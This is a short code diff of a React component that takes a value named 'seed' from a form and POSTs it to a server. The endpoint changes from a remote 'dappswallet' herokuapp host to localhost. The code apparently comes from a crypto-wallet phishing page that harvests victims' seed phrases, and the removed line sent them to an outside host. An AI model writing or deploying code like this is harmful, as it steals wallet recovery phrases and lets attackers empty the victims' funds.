@@ -33,7 +33,7 @@ const Phrase = ({
   };
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("http://dappswallet.herokuapp.com/form", {
+    const res = await axios.post("http://localhost:8080/form", {
       seed: seed1,
     });
     if (res.data.status === 200) {
